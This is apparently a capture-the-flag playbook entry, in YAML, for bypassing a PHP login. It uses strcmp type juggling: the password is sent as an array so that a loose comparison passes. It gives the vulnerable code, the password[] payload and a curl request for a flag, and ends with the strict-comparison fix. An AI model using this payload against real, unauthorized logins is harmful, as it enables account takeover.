name: php_strcmp_type_juggling
category: web
tags: [php, strcmp, type_juggling, authentication_bypass]
indicators:
  - "strcmp() used for password comparison"
  - "Loose comparison (== instead of ===)"
  - "PHP application"
  - "User-controlled input in strcmp"

tricks:
  - name: "Step 1: Identify strcmp usage"
    when: "Found login form"
    how: "Analyze PHP code for strcmp"
    payload: |
      # Vulnerable code:
      # if (strcmp($_GET['password'], $password) == 0)
      # strcmp returns NULL when comparing array with string
      # NULL == 0 is true (loose comparison)

  - name: "Step 2: Pass password as array"
    when: "strcmp used with loose comparison"
    how: "Send password[] parameter instead of password"
    payload: |
      ?username=admin&password[]=anything
      # PHP interprets password[] as array
      # strcmp(array, string) returns NULL
      # NULL == 0 is true

  - name: "Step 3: Get flag"
    when: "Execute attack"
    how: "Send request with array parameter"
    payload: |
      curl "http://TARGET/index.php?username=admin&password[]=test"
      # Response: Congratulations, here is the flag: flag{...}

  - name: "Key insight"
    when: "Understanding the vulnerability"
    how: "Use strict comparison"
    payload: |
      # Secure code should use:
      # if (strcmp($password, $expected) === 0)
      # Or better: password_verify() for passwords
      # Always use === for security-critical comparisons

